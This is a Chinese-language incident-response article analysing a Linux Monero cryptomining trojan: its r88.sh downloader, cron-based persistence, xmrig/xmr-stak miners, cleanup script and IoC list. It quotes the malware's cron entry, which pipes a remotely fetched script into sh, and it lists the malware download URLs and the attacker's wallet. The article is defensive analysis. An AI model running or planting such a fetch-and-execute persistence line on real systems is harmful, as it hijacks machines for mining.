> 原文链接: https://www.anquanke.com//post/id/106878 


# 一个Linux平台的“门罗币”挖矿木马的查杀与分析


                                阅读量   
                                **132725**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t0135e87aacc45dcd26.png)](https://p1.ssl.qhimg.com/t0135e87aacc45dcd26.png)



> 近期接到客户反映，其机房有一台redhat服务器很卡，导致很多服务响应速度很慢的情况。通过远程到客户机器，发现一个进程占据700%多CPU的使用率。通过分析，定性为是一起针对“门罗币”的挖矿木马入侵事件。本文记录处理该事件的关键过程以及对该挖矿木马核心代码进行的分析，方便做事件响应的同行们碰到同家族类型木马后可以快速查杀，定性威胁事件。



## 1．木马行为与查杀过程

### 主要行为

木马以r88.sh作为downloader首先控制服务器，通过判断当前账户的权限是否为root来进行下一步的操作，若为root则在目录/var/spool/cron/root和/var/spool/cron/crontabs/root下写计划任务“*/5 * * * * curl -sL https://x.co/6nPMR | sh”，其中这个短链接还原后为https://xmr.enjoytopic.tk/12/r88.sh。若为非root账户，则不写计划任务。接着均会执行下载运行rootv2.sh或lowerv2.sh（基于当前账户是否为root来选择下载脚本）等一系列的操作。

木马的挖矿组件bashd和bashe在系统中执行后，毫不掩饰地就开始挖矿，CPU直接就占据好几百，简直粗暴。是不是应该考虑下根据机器的当前运行状态来“人性化挖矿”呢？

[![](https://p5.ssl.qhimg.com/t01ee6876481ac90d4e.png)](https://p5.ssl.qhimg.com/t01ee6876481ac90d4e.png)



### 简单的进程保护行为

为了防被杀后还能继续挖矿，其通过写入定时任务的方式来实现简单的进程保护，通过一定时间间隔使用curl与wget远程下载shell脚本程序执行，该脚本的功能会执行本地路径下已存在的挖矿程序，若不存在则会重新下载挖矿程序执行。

[![](https://p5.ssl.qhimg.com/t01612e73c0bfa87008.png)](https://p5.ssl.qhimg.com/t01612e73c0bfa87008.png)

其中该木马在多个路径都写入了定时任务来实现维持访问，包括：/var/spool/cron/root、/var/spool/cron/crontabs/root以及/etc/cron.d。前两个位置直接就在r88.sh这个文件中暴露了出来：

[![](https://p5.ssl.qhimg.com/t01c63dd8a1c191c793.png)](https://p5.ssl.qhimg.com/t01c63dd8a1c191c793.png)

要清除该木马需要清除三个位置所有的定时任务，要不然该木马还会死灰复燃，重新被启动挖矿。

所幸该木马并没有感染传播的蠕虫属性，猜测是攻击者直接通过一般漏洞来进行的无差别攻击植入的挖矿downloader。经过对服务器进行渗透测试，确实发现了Apache ActiveMQ Fileserver远程代码执行漏洞（CVE-2016-3088）与ActiveMQ 反序列化漏洞（CVE-2015-5254）。所以企业在上线服务之前最好还是先让安全从业人员先进行安全评估加固之后会更加安全一些。



## 木马查杀

> <!-- [if !supportLists]-->1） <!--[endif]-->尝试杀掉bashd与bashe进程以及root.sh/rootv2.sh/lower.sh/lowerv2.sh与r88.sh这些shell进程
<!-- [if !supportLists]-->2） <!--[endif]-->清除掉/tmp目录下木马释放的文件：/tmp/bashd、/tmp/bashe、/tmp/root.sh、/tmp/rootv2.sh 、/tmp/r88.sh、/tmp/pools.txt、/tmp/config.json等
<!-- [if !supportLists]-->3） <!--[endif]-->清除3个位置的定时任务：/var/spool/cron/root、/var/spool/cron/crontabs/root以及/etc/cron.d

对应的自动查杀脚本如下

```
#!/bin/bash

for ((i=1;i&gt;0;i++))

do

         ps -ef | grep "/tmp/bashd -p bashd" | grep -v grep | awk '`{`print $2`}`' | xargs kill

         ps -ef | grep "/tmp/bashe -p bashd" | grep -v grep | awk '`{`print $2`}`' | xargs kill

         ps -ef | grep "bash /tmp/root.sh" | grep -v grep | awk '`{`print $2`}`' | xargs kill

         ps -ef | grep "bash /tmp/r88.sh" | grep -v grep | awk '`{`print $2`}`' | xargs kill

         ps -ef | grep "bash /tmp/rootv2.sh" | grep -v grep | awk '`{`print $2`}`' | xargs kill

ps -ef | grep "bash /tmp/lower.sh" | grep -v grep | awk '`{`print $2`}`' | xargs kill

ps -ef | grep "bash /tmp/lowerv2.sh" | grep -v grep | awk '`{`print $2`}`' | xargs kill

         rm /tmp/bashd /tmp/bashe /tmp/config.json /tmp/root.sh /tmp/rootv2.sh /tmp/r88.sh /tmp/pools.txt -r

         rm /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.d/root

done
```



## 2．木马核心代码分析

### 木马整体编写逻辑

该木马使用Linux系统的shell脚本编写Downloader，使用curl与wget命令发起网络请求下载木马的其他组件，虽然代码可被轻易分析，但是编写成本和门槛降低，这也是当前恶意代码使用脚本语言编写的一个趋势。

[![](https://p2.ssl.qhimg.com/t0165bfd418c1949f98.png)](https://p2.ssl.qhimg.com/t0165bfd418c1949f98.png)

该木马一共涉及多个脚本与可执行文件：

[![](https://p5.ssl.qhimg.com/t01833f5ed45549fde1.png)](https://p5.ssl.qhimg.com/t01833f5ed45549fde1.png)



## 配置文件

bashe的config.json配置文件：

[![](https://p3.ssl.qhimg.com/t0186b148b61c94460c.png)](https://p3.ssl.qhimg.com/t0186b148b61c94460c.png)

config.json这个配置文件中显示其矿池地址为pool.supportxmr.com:80，

用户为：

46TCcaaDn4LXkWZ1EGKBkzcWsTm32Mmy8a2VWqL8pGhRPf65GmUdkZWbrLVYNhFaucWXjU5aJqMraLMEoXq53GHYJPv3LP6

bashd的pools.txt配置文件：

[![](https://p5.ssl.qhimg.com/t01594fb4fd2096ebf2.png)](https://p5.ssl.qhimg.com/t01594fb4fd2096ebf2.png)

该配置文件中显示器矿池地址为pool.supportxmr.com:80，钱包地址为：

46TCcaaDn4LXkWZ1EGKBkzcWsTm32Mmy8a2VWqL8pGhRPf65GmUdkZWbrLVYNhFaucWXjU5aJqMraLMEoXq53GHYJPv3LP6，矿池密码为bashe。



### r88.sh代码分析

r88.sh首先判断当前用户是否为root账户，若是则下载并执行root.sh，若下载执行失败则会下载执行rootv2.sh，两者代码一样；若非root账户，那么则下载并执行lower.sh，若下载失败则下载执行lowerv2.sh，root.sh与rootv2.sh两者代码一致。下图是r88.sh的完整代码截图。

[![](https://p4.ssl.qhimg.com/t0172e116b0d310ce23.png)](https://p4.ssl.qhimg.com/t0172e116b0d310ce23.png)



### lowerv2.sh代码分析

lowerv2.sh是在非root权限下才会被执行的downloader脚本，代码中有两个函数：kills和downloadyam，隔600s循环执行。

[![](https://p0.ssl.qhimg.com/t01dcb6a22f8f54f4d3.png)](https://p0.ssl.qhimg.com/t01dcb6a22f8f54f4d3.png)

Kills函数用于删除其他同行的挖矿木马的文件并kill进程，真是一山不能容二马的节奏啊。

[![](https://p4.ssl.qhimg.com/t01a1d46cab67d299d8.png)](https://p4.ssl.qhimg.com/t01a1d46cab67d299d8.png)

[![](https://p2.ssl.qhimg.com/t01694f7e9bb1a99359.png)](https://p2.ssl.qhimg.com/t01694f7e9bb1a99359.png)

其中downloadyam函数，用于下载挖矿程序bashd和bashe以及对应的配置文件并执行挖矿程序。



### lower.sh代码分析

若当前用户是非root权限，r88.sh会作为下载器下载该脚本，若是其下载执行失败，那么就会选择下载lowerv2.sh。两个脚本完全一样，只是为了在下载失败时作为替代的保险操作。



### rootv2.sh代码分析

rootv2.sh的代码与lowerv2.sh的代码完全一样，只是rootv2.sh的代码多了两行注释：

[![](https://p0.ssl.qhimg.com/t0196aa7700ad953174.png)](https://p0.ssl.qhimg.com/t0196aa7700ad953174.png)

猜测是作者本来想在rootv2.sh中加入写crontab的代码的，可是最后没有加上，故rootv2.sh与lowerv2.sh代码当前是完全一样的。



### root.sh代码分析

当前用户若是root权限，root.sh是r88.sh下载首选，在下载root.sh失败的情况下才会选择下载rootv2.sh，两个文件的代码是完全一致的。r88.sh的代码片段如下：

[![](https://p5.ssl.qhimg.com/t01c3d8492a4180139c.png)](https://p5.ssl.qhimg.com/t01c3d8492a4180139c.png)



## Bashe代码分析

该ELF可执行文件静态编译造成程序达到20m，通过对其代码分析发现跟很多挖矿木马一样使用到了开源的挖矿代码，该程序使用的开源挖矿项目在：[https://github.com/fireice-uk/xmr-stak-cpu](https://github.com/fireice-uk/xmr-stak-cpu)，是一个通用的挖矿项目，支持CPU，AMD与NVIDIA GPU，用于挖“门罗币”。下图可见该可执行文件中多处使用引用的代码：



[![](https://p0.ssl.qhimg.com/t015ab14ccaf6359b0c.png)](https://p0.ssl.qhimg.com/t015ab14ccaf6359b0c.png)

[![](https://p0.ssl.qhimg.com/t01bb3f120fe8877d8c.png)](https://p0.ssl.qhimg.com/t01bb3f120fe8877d8c.png)

通过对比github上的代码：

[![](https://p4.ssl.qhimg.com/t017a0bd810e82d331e.png)](https://p4.ssl.qhimg.com/t017a0bd810e82d331e.png)

可确定其是基于开源代码xmr-stak 2.4.2编写的一个针对门罗币的挖矿木马。



### Bashd代码分析

该木马用于针对“门罗币”挖矿的组件，x64架构的ELF格式文件。通过代码相似性分析可确定该程序是基于xmrig 2.5.2开源项目开发的一个基于CPU的针对Monero（XMR）的挖矿木马。

[![](https://p1.ssl.qhimg.com/t019a5cec610d0d6ea1.png)](https://p1.ssl.qhimg.com/t019a5cec610d0d6ea1.png)

该项目在：[https://github.com/xmrig/xmrig](https://github.com/xmrig/xmrig)



## 3．总结

该挖矿木马并没有使用很多高级的防查杀技术，也没有广泛传播的蠕虫属性，仅仅使用定时任务来实现简单的进程保护，通过无差别攻击进行“抓鸡”植入木马，而且直接使用shell脚本编写的下载器加上开源的挖矿代码就开始“抓肉鸡”挖矿，由此可见现在对于挖矿木马的门槛在降低，但是这样简单的操作就足以严重危害网络的可用性与安全性。

关于挖矿木马如何防范与其他恶意代码以及入侵事件如何防范一样，实际上均是老生常谈的话题，最重要的一点还是企业需要正视网络安全的重要性，及时对系统以及应用打补丁，定期组织安全人员进行服务器的维护，提高企业员工的安全意识等等。



## 4．IoC

> [http://abcde.sw5y.com](http://abcde.sw5y.com/)
[http://abcde.sw5y.com/l2/lowerv2.sh](http://abcde.sw5y.com/l2/lowerv2.sh)
[http://abcde.sw5y.com/l2/rootv2.sh](http://abcde.sw5y.com/l2/rootv2.sh)
[http://abcde.sw5y.com/l2/pools.txt](http://abcde.sw5y.com/l2/pools.txt)
[http://abcde.sw5y.com/l2/bashd](http://abcde.sw5y.com/l2/bashd)
[http://abcde.sw5y.com/l2/bashe](http://abcde.sw5y.com/l2/bashe)
[https://xmr.enjoytopic.tk/12/r88.sh](https://xmr.enjoytopic.tk/12/r88.sh)
[https://xmr.enjoytopic.tk](https://xmr.enjoytopic.tk/)

```
8965edd7205ffc4a7711313715f1621a7817621a0db03245022fc6e8b2ae8642

e3b0296ddec24cc0d7ef27b4896a0616f20394cb0293b22c1ac744c530451b47

27fbcee0f3f007e846ec4367c6ef55c8d2d790f22b12d551b0df93c369c5cb76

f90bada1b2562c3b7727fee57bd7edf453883219a2ee45923abbd539708236b0

0122604e4d65b181ad9fbd782743df6dafe6371bcf24638eb2d4aa962a272015

3d75b68b05aa00cb8ace5c27b35341a5c33c14c547313f04afa8bc5193366755
```
